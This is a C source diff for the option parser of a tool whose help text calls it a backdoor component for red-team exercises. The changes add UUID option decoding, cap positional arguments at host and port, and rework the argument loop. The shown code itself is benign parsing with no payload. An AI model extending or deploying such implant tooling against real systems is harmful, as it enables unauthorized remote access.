@@ -12,6 +12,7 @@
 
 #include "config.h"
 #include "base64.h"
+#include "uuid4.h"
 
 // Nifty macro trick to expand using quotes.
 // https://stackoverflow.com/a/3419392/426293
@@ -57,6 +58,12 @@ int _option_bool(char *input, void *output, size_t size)
     return 0;
 }
 
+int _option_uuid(char *input, void *output, size_t size)
+{
+    if (size != 16) return -1;
+    return uuid_decode(input, output);
+}
+
 #if TICK_FEATURES_CRYPTO
 int _option_base64(char *input, void *output, size_t size)
 {
@@ -99,6 +106,7 @@ int _option_config_file(char *input, void *output, size_t size)
 #define OPTION_NUMBER    _option_int
 #define OPTION_FLAG      _option_bool
 #define OPTION_TIMESTAMP _option_timestamp
+#define OPTION_UUID      _option_uuid
 #define OPTION_BLOB      _option_base64
 
 // Macro to populate the Options structure more easily.
@@ -112,18 +120,16 @@ static const Option options_table[] = {
     DEFINE_OPTION("host",   hostname,   OPTION_STRING),
     DEFINE_OPTION("port",   port,       OPTION_NUMBER),
 
-#if TICK_FEATURES_CRYPTO
-    DEFINE_OPTION("ssl",    use_ssl,    OPTION_FLAG),
-#endif
-
-#ifdef _WIN32
-    DEFINE_OPTION("uuid",   uuid,       OPTION_STRING),
-#endif
-
 #if TICK_FEATURES_TIME_LIMIT
     DEFINE_OPTION("begin",  start_time, OPTION_TIMESTAMP),
     DEFINE_OPTION("end",    end_time,   OPTION_TIMESTAMP),
 #endif
+
+#if TICK_FEATURES_CRYPTO
+    DEFINE_OPTION("ssl",    use_ssl,    OPTION_FLAG),
+#endif
+
+    DEFINE_OPTION("uuid",   uuid,       OPTION_UUID),
 
     // Special entry for the configuration file.
 #if TICK_CONFIG_USE_FILE && (TICK_CONFIG_USE_ARGV || TICK_CONFIG_USE_ENV || TICK_MAX_CONFIG_FILE_DEPTH > 1)
@@ -132,6 +138,7 @@ static const Option options_table[] = {
 
 };
 static const int options_count = sizeof(options_table) / sizeof(options_table[0]);
+static const int options_positionals = 2;       // just hostname and port
 
 // Find an option by short name (the first character).
 // Returns an index into options_table[] or -1 if not found.
@@ -187,8 +194,8 @@ int parse_command_line(Settings *s, int argc, char *argv[], int skip_first)
 
     // Loop for every command line argument except the first.
     // The first argument is assumed to be the executable.
-    int i;
-    for (i = first; i < argc; i++) {
+    int i = first;
+    while (i < argc) {
         option_index = -1;
 
         // Determine if it's a short option, a long option, or a positional.
@@ -201,6 +208,7 @@ int parse_command_line(Settings *s, int argc, char *argv[], int skip_first)
                     // This turns off option parsing,
                     // leaving only positional arguments.
                     final = 1;
+                    i++;
                     continue;
 
                 }
@@ -227,8 +235,9 @@ int parse_command_line(Settings *s, int argc, char *argv[], int skip_first)
         } else {
 
             // It's a positional.
-            if (pos >= options_count) {
+            if (pos >= options_positionals) {
                 success = -1;
+                i++;
                 continue;
             }
             option_index = pos;
@@ -237,6 +246,7 @@ int parse_command_line(Settings *s, int argc, char *argv[], int skip_first)
         }
         if (option_index < 0) {
             success = -1;
+                i++;
             continue;
         }
         if (i == argc) break;
@@ -245,6 +255,9 @@ int parse_command_line(Settings *s, int argc, char *argv[], int skip_first)
         if (parse_option(s, option_index, argv[i]) < 0) {
             return -1;
         }
+
+        // Next token.
+        i++;
     }
 
     // Return 0 on success, -1 on failure.
@@ -545,6 +558,7 @@ __attribute__((unused))
         "\t--begin EPOCH\n"
         "\t--end EPOCH\n"
 #endif
+        "\t--uuid UUID\n"
 #if TICK_CONFIG_USE_FILE
         "\t--config FILE\n"
 #endif
@@ -628,8 +642,11 @@ __attribute__((unused))
     printf("\n"
         "This is a backdoor component used for security testing and red team exercises.\n"
         "If you are seeing this software installed on your system, you should probably\n"
-        "report the incident to your local security team.\n\n"
+        "report the incident to your local security team.\n"
         );
+#ifndef _WIN32
+    printf("\n");
+#endif
 }
 
 #endif
